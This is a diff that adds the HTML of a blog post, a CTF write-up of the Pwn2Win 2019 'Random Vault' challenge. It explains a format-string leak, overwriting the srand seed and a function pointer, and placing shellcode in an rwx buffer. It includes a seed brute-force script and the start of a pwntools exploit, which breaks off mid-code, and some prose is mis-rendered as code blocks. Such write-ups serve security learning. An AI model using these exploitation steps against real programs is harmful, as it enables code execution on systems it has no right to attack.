@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Random Vault -- Pwn2Win 2019 CTF - Pedro Bernardo</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="With Jorge
+Points: 303 (dynamic) Solves: 18
+TL;DR Only two Format String vulnerability allowed. Use first Format String to bypass PIE mitigation Use second Format String to: change srand() seed value change function pointer Built shellcode and get shell Reversing Binary Mitigations Arch: amd64-64-little RELRO: FULL RELRO STACK: Canary Found NX: NX enabled PIE: PIE enabled The binary functionality is pretty simple:
+1. Change username Let&rsquo;s you change the username once, will lead to printf(username)." />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="Random Vault -- Pwn2Win 2019 CTF" />
+<meta property="og:description" content="With Jorge
+Points: 303 (dynamic) Solves: 18
+TL;DR Only two Format String vulnerability allowed. Use first Format String to bypass PIE mitigation Use second Format String to: change srand() seed value change function pointer Built shellcode and get shell Reversing Binary Mitigations Arch: amd64-64-little RELRO: FULL RELRO STACK: Canary Found NX: NX enabled PIE: PIE enabled The binary functionality is pretty simple:
+1. Change username Let&rsquo;s you change the username once, will lead to printf(username)." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="//localhost:1313/blog/posts/2019-11-10-pwn2win19_random_vault/" /><meta property="article:section" content="blog" />
+<meta property="article:published_time" content="2019-11-10T00:00:00+00:00" />
+<meta property="article:modified_time" content="2019-11-10T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Random Vault -- Pwn2Win 2019 CTF"/>
+<meta name="twitter:description" content="With Jorge
+Points: 303 (dynamic) Solves: 18
+TL;DR Only two Format String vulnerability allowed. Use first Format String to bypass PIE mitigation Use second Format String to: change srand() seed value change function pointer Built shellcode and get shell Reversing Binary Mitigations Arch: amd64-64-little RELRO: FULL RELRO STACK: Canary Found NX: NX enabled PIE: PIE enabled The binary functionality is pretty simple:
+1. Change username Let&rsquo;s you change the username once, will lead to printf(username)."/>
+<script src="//localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="//localhost:1313/css/fonts.0db1b638c3c6b12e3f0bf5303b558492d936bf9102ec4c4ba2bdc315e2a4184f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="//localhost:1313/css/main.5cebd7d4fb2b97856af8d32a6def16164fcf7d844e98e236fcb3559655020373.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="//localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"   />
+	
+
+	
+	
+		<script type="text/javascript"
+		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+		</script>
+
+		
+		<script type="text/x-mathjax-config">
+		MathJax.Hub.Config({
+			tex2jax: {
+				inlineMath: [['$','$'], ['\\(','\\)']],
+				displayMath: [['$$','$$'], ['\[','\]']],
+				processEscapes: true,
+				processEnvironments: true,
+				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+				TeX: { equationNumbers: { autoNumber: "AMS" },
+						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
+			}
+		});
+		</script>
+	
+
+	
+	
+		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
+
+		
+		<script>
+			document.addEventListener("DOMContentLoaded", function() {
+					renderMathInElement(document.body, {
+							delimiters: [
+									{left: "$$", right: "$$", display: true},
+									{left: "$", right: "$", display: false}
+							]
+					});
+			});
+			</script>
+	
+
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="//localhost:1313/">Pedro Bernardo</a>
+	</div>
+	<nav>
+		
+		<a href="/blog">Blog</a>
+		
+		<a href="/blog/posts">All posts</a>
+		
+		<a href="/tags">Tags</a>
+		
+		<a href="/">CV</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">Random Vault -- Pwn2Win 2019 CTF</h1>
+			<div class="meta">Posted on Nov 10, 2019</div>
+		</div>
+		
+
+		
+
+		<section class="body">
+			<p>With <a href="https://twitter.com/jorge_cmartins">Jorge</a></p>
+<p><strong>Points:</strong> 303 (dynamic)
+<strong>Solves:</strong> 18</p>
+<h2 id="tldr">TL;DR</h2>
+<ol>
+<li>Only two Format String vulnerability allowed.</li>
+<li>Use first Format String to bypass PIE mitigation</li>
+<li>Use second Format String to:
+<ul>
+<li>change srand() seed value</li>
+<li>change function pointer</li>
+</ul>
+</li>
+<li>Built shellcode and get shell</li>
+</ol>
+<h2 id="reversing">Reversing</h2>
+<h4 id="binary-mitigations">Binary Mitigations</h4>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Arch:   amd64-64-little
+</span></span><span style="display:flex;"><span>RELRO:  FULL RELRO
+</span></span><span style="display:flex;"><span>STACK:  Canary Found
+</span></span><span style="display:flex;"><span>NX:     NX enabled
+</span></span><span style="display:flex;"><span>PIE:    PIE enabled
+</span></span></code></pre></div><p>The binary functionality is pretty simple:</p>
+<h4 id="1-change-username">1. Change username</h4>
+<p>Let&rsquo;s you change the username <strong>once</strong>, will lead to <code>printf(username)</code>. The <code>username</code> is a maximum of 80 bytes long.</p>
+<h4 id="2-store-secret">2. Store secret</h4>
+<ul>
+<li>We can store 7 secrets in the <code>vault</code> (a buffer in the <code>.bss</code>).</li>
+<li>Each secret is indexed on the <code>vault</code> by the last byte of <code>rand()</code>, so we don&rsquo;t have full control where they are stored:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">for</span> (i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; i <span style="color:#ff7b72;font-weight:bold">&lt;=</span> <span style="color:#a5d6ff">6</span>; <span style="color:#ff7b72;font-weight:bold">++</span>i){
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;Secret #%d: &#34;</span>, i<span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">1</span>);
+</span></span><span style="display:flex;"><span>    r <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">rand</span>();
+</span></span><span style="display:flex;"><span>    local_buffer[i] <span style="color:#ff7b72;font-weight:bold">=</span> r <span style="color:#ff7b72;font-weight:bold">&amp;</span> <span style="color:#a5d6ff">0xff</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">scanf</span>(<span style="color:#a5d6ff">&#34;%llu&#34;</span>, <span style="color:#ff7b72;font-weight:bold">&amp;</span>vault[local_buffer[i]]);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li>After each store, a function pointer,<code>target</code>, is called which resets the  <code>seed</code> to <code>seed = time(0)</code> and asks us if we want to reset the vault.</li>
+</ul>
+<h4 id="3-reset-vault">3. Reset vault</h4>
+<p>Clears the <code>vault</code> to 0, resets the <code>target</code> pointer, resets the <code>seed</code> to <code>time(0)</code></p>
+<blockquote>
+<p><strong>Notes:</strong>
+The <code>target</code>, <code>seed</code> and the<code>vault</code> are all together in the bss segment:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"></code></pre></div></blockquote>
+<p>0x5000 -&gt; target
+0x5008 -&gt; seed
+0x5010 -&gt; vault start
+&hellip;
+0x6000 -&gt; vault end</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">&gt;</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#ff7b72;font-weight:bold">&gt;</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">And</span><span style="color:#6e7681"> </span>this<span style="color:#6e7681"> </span>segment<span style="color:#6e7681"> </span>has<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">`</span>rwx<span style="color:#ff7b72;font-weight:bold">`</span><span style="color:#6e7681"> </span>permissions:<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">`</span><span style="color:#d2a8ff;font-weight:bold">mprotect</span>(<span style="color:#ff7b72;font-weight:bold">&amp;</span>target,<span style="color:#6e7681"> </span><span style="color:#a5d6ff">0</span>x1000,<span style="color:#6e7681"> </span><span style="color:#a5d6ff">7</span>)<span style="color:#ff7b72;font-weight:bold">`</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#8b949e;font-style:italic">## Vulnerability
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span>Doing<span style="color:#6e7681"> </span>some<span style="color:#6e7681"> </span>tests<span style="color:#6e7681"> </span><span style="color:#ff7b72">on</span><span style="color:#6e7681"> </span>the<span style="color:#6e7681"> </span>program,<span style="color:#6e7681"> </span>we<span style="color:#6e7681"> </span>quickly<span style="color:#6e7681"> </span>spotted<span style="color:#6e7681"> </span>a<span style="color:#6e7681"> </span>format<span style="color:#6e7681"> </span>string<span style="color:#6e7681"> </span>vulnerability<span style="color:#6e7681"> </span><span style="color:#ff7b72">on</span><span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">`</span>Username<span style="color:#ff7b72;font-weight:bold">`</span><span style="color:#6e7681">
+</span></span></span></code></pre></div><p>Welcome to the Vault!
+Username: %p|%p|%p|%p
+=== VAULT ===
+Hello, 0x2|0xf|(nil)|0x5</p>
+<p>Actions:</p>
+<ol>
+<li>Change username</li>
+<li>Store secret</li>
+<li>Reset vault</li>
+<li>Quit</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#8b949e;font-style:italic">## Exploitation
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span>Since<span style="color:#6e7681"> </span>we<span style="color:#6e7681"> </span>can<span style="color:#6e7681"> </span>leak<span style="color:#6e7681"> </span>stack<span style="color:#6e7681"> </span><span style="color:#ff7b72">values</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">with</span><span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">`</span>username<span style="color:#ff7b72;font-weight:bold">`</span>,<span style="color:#6e7681"> </span>we<span style="color:#6e7681"> </span>immediately<span style="color:#6e7681"> </span>got<span style="color:#6e7681"> </span>the<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">`</span>stack<span style="color:#6e7681"> </span>cookie<span style="color:#ff7b72;font-weight:bold">`</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">and</span><span style="color:#6e7681"> </span>defeated<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">`</span>PIE<span style="color:#6e7681"> </span>mitigation<span style="color:#ff7b72;font-weight:bold">`</span>,<span style="color:#6e7681"> </span>now<span style="color:#6e7681"> </span>we<span style="color:#6e7681"> </span>know<span style="color:#6e7681"> </span><span style="color:#ff7b72">where</span><span style="color:#6e7681"> </span>the<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">`</span>target<span style="color:#ff7b72;font-weight:bold">`</span>,<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">`</span>seed<span style="color:#ff7b72;font-weight:bold">`</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">and</span><span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">`</span>vault<span style="color:#ff7b72;font-weight:bold">`</span><span style="color:#6e7681"> </span>are.<span style="color:#6e7681"> </span>Getting<span style="color:#6e7681"> </span>the<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">`</span>stack<span style="color:#6e7681"> </span>cookie<span style="color:#ff7b72;font-weight:bold">`</span><span style="color:#6e7681"> </span>turned<span style="color:#6e7681"> </span><span style="color:#ff7b72">out</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">to</span><span style="color:#6e7681"> </span>be<span style="color:#6e7681"> </span>useless<span style="color:#6e7681"> </span>since<span style="color:#6e7681"> </span>no<span style="color:#6e7681"> </span>overflow<span style="color:#6e7681"> </span>was<span style="color:#6e7681"> </span>found.<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span>We<span style="color:#6e7681"> </span>need<span style="color:#6e7681"> </span><span style="color:#ff7b72">to</span><span style="color:#6e7681"> </span>keep<span style="color:#6e7681"> </span><span style="color:#ff7b72">in</span><span style="color:#6e7681"> </span>mind<span style="color:#6e7681"> </span>that<span style="color:#6e7681"> </span>we<span style="color:#6e7681"> </span>can<span style="color:#6e7681"> </span><span style="color:#ff7b72">write</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">to</span><span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">`</span>vault<span style="color:#ff7b72;font-weight:bold">`</span><span style="color:#6e7681"> </span>which<span style="color:#6e7681"> </span>has<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">`</span>rwx<span style="color:#ff7b72;font-weight:bold">`</span><span style="color:#6e7681"> </span>permissions,<span style="color:#6e7681"> </span><span style="color:#ff7b72">and</span><span style="color:#6e7681"> </span>we<span style="color:#6e7681"> </span>can<span style="color:#6e7681"> </span>overwrite<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">`</span>target<span style="color:#ff7b72;font-weight:bold">`</span>,<span style="color:#6e7681"> </span><span style="color:#ff7b72">with</span><span style="color:#6e7681"> </span>the<span style="color:#6e7681"> </span>format<span style="color:#6e7681"> </span>string,<span style="color:#6e7681"> </span><span style="color:#ff7b72">to</span><span style="color:#6e7681"> </span>point<span style="color:#6e7681"> </span><span style="color:#ff7b72">to</span><span style="color:#6e7681"> </span>the<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">`</span>vault<span style="color:#ff7b72;font-weight:bold">`</span>.<span style="color:#6e7681"> </span>So<span style="color:#6e7681"> </span>we<span style="color:#6e7681"> </span>need<span style="color:#6e7681"> </span><span style="color:#ff7b72">to</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">write</span><span style="color:#6e7681"> </span>shellcode<span style="color:#6e7681"> </span><span style="color:#ff7b72">to</span><span style="color:#6e7681"> </span>the<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">`</span>vault<span style="color:#ff7b72;font-weight:bold">`</span>,<span style="color:#6e7681"> </span><span style="color:#ff7b72">and</span><span style="color:#6e7681"> </span>overwrite<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">`</span>target<span style="color:#ff7b72;font-weight:bold">`</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">to</span><span style="color:#6e7681"> </span>point<span style="color:#6e7681"> </span><span style="color:#ff7b72">to</span><span style="color:#6e7681"> </span>our<span style="color:#6e7681"> </span>shellcode.<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span>There<span style="color:#6e7681"> </span>are<span style="color:#6e7681"> </span>two<span style="color:#6e7681"> </span>problems<span style="color:#6e7681"> </span><span style="color:#ff7b72">with</span><span style="color:#6e7681"> </span>this<span style="color:#6e7681"> </span>approach:<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#a5d6ff">1</span>.<span style="color:#6e7681"> </span>We<span style="color:#6e7681"> </span>can<span style="color:#a5d6ff">&#39;t control the exact location where we write in the `vault`, because the indexes are generated from the `rand()` call.
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">2. Brute forcing the indexes to be contiguous on a fixed offset was taking too much time.
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">3. If we first get a contiguous shellcode, we can&#39;</span>t<span style="color:#6e7681"> </span><span style="color:#ff7b72">then</span><span style="color:#6e7681"> </span>jump<span style="color:#6e7681"> </span><span style="color:#ff7b72">to</span><span style="color:#6e7681"> </span>it<span style="color:#6e7681"> </span>because<span style="color:#6e7681"> </span>changing<span style="color:#6e7681"> </span>the<span style="color:#6e7681"> </span>username<span style="color:#6e7681"> </span><span style="color:#ff7b72">to</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">alter</span><span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">`</span>target<span style="color:#ff7b72;font-weight:bold">`</span><span style="color:#6e7681"> </span>will<span style="color:#6e7681"> </span>reset<span style="color:#6e7681"> </span>the<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">`</span>vault<span style="color:#ff7b72;font-weight:bold">`</span>.<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#ff7b72">To</span><span style="color:#6e7681"> </span>solve<span style="color:#6e7681"> </span><span style="color:#ff7b72">both</span><span style="color:#6e7681"> </span>of<span style="color:#6e7681"> </span>this<span style="color:#6e7681"> </span>problems<span style="color:#6e7681"> </span>we<span style="color:#6e7681"> </span>could<span style="color:#6e7681"> </span><span style="color:#ff7b72">to</span><span style="color:#6e7681"> </span>find<span style="color:#6e7681"> </span>a<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">`</span>seed<span style="color:#ff7b72;font-weight:bold">`</span><span style="color:#6e7681"> </span>value<span style="color:#6e7681"> </span>that<span style="color:#6e7681"> </span>generates<span style="color:#6e7681"> </span>at<span style="color:#6e7681"> </span>least<span style="color:#6e7681"> </span><span style="color:#a5d6ff">4</span><span style="color:#6e7681"> </span>consecutive<span style="color:#6e7681"> </span>indexes<span style="color:#6e7681"> </span><span style="color:#ff7b72">out</span><span style="color:#6e7681"> </span>of<span style="color:#6e7681"> </span>the<span style="color:#6e7681"> </span><span style="color:#a5d6ff">7</span><span style="color:#6e7681"> </span>(i.e.,<span style="color:#6e7681"> </span><span style="color:#a5d6ff">1</span>,<span style="color:#6e7681"> </span><span style="color:#a5d6ff">2</span>,<span style="color:#6e7681"> </span><span style="color:#a5d6ff">3</span>,<span style="color:#6e7681"> </span><span style="color:#a5d6ff">4</span>)<span style="color:#6e7681"> </span><span style="color:#ff7b72">in</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">order</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">for</span><span style="color:#6e7681"> </span>our<span style="color:#6e7681"> </span>shellcode<span style="color:#6e7681"> </span><span style="color:#ff7b72">to</span><span style="color:#6e7681"> </span>be<span style="color:#6e7681"> </span>contiguous.<span style="color:#6e7681"> </span>Since<span style="color:#6e7681"> </span>our<span style="color:#6e7681"> </span>shellcode<span style="color:#6e7681"> </span><span style="color:#ff7b72">is</span><span style="color:#6e7681"> </span><span style="color:#a5d6ff">27</span><span style="color:#6e7681"> </span>bytes<span style="color:#6e7681"> </span><span style="color:#ff7b72">long</span>,<span style="color:#6e7681"> </span>we<span style="color:#6e7681"> </span>padded<span style="color:#6e7681"> </span>it<span style="color:#6e7681"> </span><span style="color:#ff7b72">with</span><span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">`</span>nops<span style="color:#ff7b72;font-weight:bold">`</span><span style="color:#6e7681"> </span>it<span style="color:#6e7681"> </span>becomes<span style="color:#6e7681"> </span><span style="color:#a5d6ff">32</span><span style="color:#6e7681"> </span>bytes<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#6e7681"> </span><span style="color:#a5d6ff">4</span><span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#6e7681"> </span><span style="color:#a5d6ff">8</span>.<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span>Finding<span style="color:#6e7681"> </span>the<span style="color:#6e7681"> </span>seed<span style="color:#6e7681"> </span><span style="color:#ff7b72">is</span><span style="color:#6e7681"> </span>quite<span style="color:#6e7681"> </span>straightforward,<span style="color:#6e7681"> </span><span style="color:#ff7b72">with</span><span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">`</span>seed<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#6e7681"> </span><span style="color:#a5d6ff">0</span>xdcd8<span style="color:#ff7b72;font-weight:bold">`</span>,<span style="color:#6e7681"> </span>we<span style="color:#6e7681"> </span>get<span style="color:#6e7681"> 
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span>following<span style="color:#6e7681"> </span>indexes:<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">`</span><span style="color:#a5d6ff">12</span>,<span style="color:#6e7681"> </span><span style="color:#a5d6ff">215</span>,<span style="color:#6e7681"> </span><span style="color:#a5d6ff">164</span>,<span style="color:#6e7681"> </span><span style="color:#a5d6ff">11</span>,<span style="color:#6e7681"> </span><span style="color:#a5d6ff">64</span>,<span style="color:#6e7681"> </span><span style="color:#a5d6ff">9</span>,<span style="color:#6e7681"> </span><span style="color:#a5d6ff">10</span><span style="color:#ff7b72;font-weight:bold">`</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span>This<span style="color:#6e7681"> </span>was<span style="color:#6e7681"> </span>the<span style="color:#6e7681"> </span>script<span style="color:#6e7681"> </span>we<span style="color:#6e7681"> </span>wrote:<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#ff7b72;font-weight:bold">```</span>python<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#ff7b72">from</span><span style="color:#6e7681"> </span>ctypes<span style="color:#6e7681"> </span>import<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span>libc<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#6e7681"> </span><span style="color:#d2a8ff;font-weight:bold">CDLL</span>(<span style="color:#a5d6ff">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>)<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#ff7b72">for</span><span style="color:#6e7681"> </span>seed<span style="color:#6e7681"> </span><span style="color:#ff7b72">in</span><span style="color:#6e7681"> </span><span style="color:#d2a8ff;font-weight:bold">range</span>(<span style="color:#a5d6ff">0</span>,<span style="color:#6e7681"> </span><span style="color:#a5d6ff">0</span>x10000):<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">    </span>this_round<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#6e7681"> </span>[]<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">    </span>libc.<span style="color:#d2a8ff;font-weight:bold">srand</span>(seed)<span style="color:#6e7681"> 
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">    </span><span style="color:#ff7b72">for</span><span style="color:#6e7681"> </span>_<span style="color:#6e7681"> </span><span style="color:#ff7b72">in</span><span style="color:#6e7681"> </span><span style="color:#d2a8ff;font-weight:bold">range</span>(<span style="color:#a5d6ff">7</span>):<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">        </span>this_round.<span style="color:#d2a8ff;font-weight:bold">append</span>(libc.<span style="color:#d2a8ff;font-weight:bold">rand</span>()<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">&amp;</span><span style="color:#6e7681"> </span><span style="color:#a5d6ff">0</span>xff)<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">        
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">    </span>this_round.<span style="color:#d2a8ff;font-weight:bold">sort</span>()<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">    </span>counter<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#6e7681"> </span><span style="color:#a5d6ff">0</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">    </span><span style="color:#ff7b72">for</span><span style="color:#6e7681"> </span>i<span style="color:#6e7681"> </span><span style="color:#ff7b72">in</span><span style="color:#6e7681"> </span><span style="color:#d2a8ff;font-weight:bold">range</span>(<span style="color:#a5d6ff">7</span><span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>):<span style="color:#6e7681"> 
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">        </span><span style="color:#ff7b72">if</span><span style="color:#6e7681"> </span>this_round[i<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#6e7681"> </span><span style="color:#a5d6ff">1</span>]<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#6e7681"> </span>this_round[i]<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">==</span><span style="color:#6e7681"> </span><span style="color:#a5d6ff">1</span>:<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">            </span>counter<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">+=</span><span style="color:#6e7681"> </span><span style="color:#a5d6ff">1</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">        </span><span style="color:#ff7b72">else</span>:<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">            </span>counter<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#6e7681"> </span><span style="color:#a5d6ff">0</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">        </span><span style="color:#ff7b72">if</span><span style="color:#6e7681"> </span>counter<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">==</span><span style="color:#6e7681"> </span><span style="color:#a5d6ff">3</span>:<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">            </span><span style="color:#8b949e;font-style:italic"># show the seed and the offset to jump to
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span><span style="color:#6e7681">            </span>print<span style="color:#6e7681"> </span><span style="color:#a5d6ff">&#34;seed &#34;</span>,<span style="color:#6e7681"> </span><span style="color:#d2a8ff;font-weight:bold">hex</span>(seed)<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">            </span>print<span style="color:#6e7681"> </span><span style="color:#a5d6ff">&#34;first offset &#34;</span>,<span style="color:#6e7681"> </span>this_round[i<span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">1</span><span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">3</span>]<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">            </span>break<span style="color:#6e7681">
+</span></span></span></code></pre></div><p>We have to keep in mind that the <code>username</code> buffer is only 80 bytes long, and we are on a 64-bit architecture, so have to be conservative with what we want to write.<br>
+Because of this, we had to only partially overwrite the <code>target</code> so we could also overwrite the <code>seed</code>.</p>
+<p>This is our final exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff7b72">from</span> <span style="color:#ff7b72">pwn</span> <span style="color:#ff7b72">import</span> <span style="color:#ff7b72;font-weight:bold">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">from</span> <span style="color:#ff7b72">fs_lib</span> <span style="color:#ff7b72">import</span> <span style="color:#ff7b72;font-weight:bold">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">leak</span>(io):
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;%9$p|%11$p&#34;</span>
+</span></span><span style="display:flex;"><span>    io<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#a5d6ff">&#34;Username: &#34;</span>, payload)
